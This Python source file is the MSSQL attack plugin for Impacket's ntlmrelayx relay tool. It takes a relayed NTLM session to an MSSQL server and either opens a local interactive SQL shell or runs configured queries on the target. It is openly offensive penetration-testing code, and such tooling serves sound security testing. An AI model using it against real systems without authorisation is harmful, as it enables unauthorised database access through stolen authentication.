# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   MSSQL Attack Class
#   MSSQL protocol relay attack
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#   Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)
#
from impacket import LOG
from impacket.examples.mssqlshell import SQLSHELL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell

PROTOCOL_ATTACK_CLASS = "MSSQLAttack"

class MSSQLAttack(ProtocolAttack):
    PLUGIN_NAMES = ["MSSQL"]
    def __init__(self, config, MSSQLclient, username):
        ProtocolAttack.__init__(self, config, MSSQLclient, username)
        if self.config.interactive:
            # Launch locally listening interactive shell.
            self.tcp_shell = TcpShell()

    def run(self):
        if self.config.interactive:
            if self.tcp_shell is not None:
                LOG.info('Started interactive MSSQL shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
                # Start listening and launch interactive shell.
                self.tcp_shell.listen()
                mssql_shell = SQLSHELL(self.client, tcpShell=self.tcp_shell)
                mssql_shell.cmdloop()
                return

        if self.config.queries is not None:
            for query in self.config.queries:
                LOG.info('Executing SQL: %s' % query)
                self.client.sql_query(query)
                self.client.printReplies()
                self.client.printRows()
        else:
            LOG.error('No SQL queries specified for MSSQL relay!')

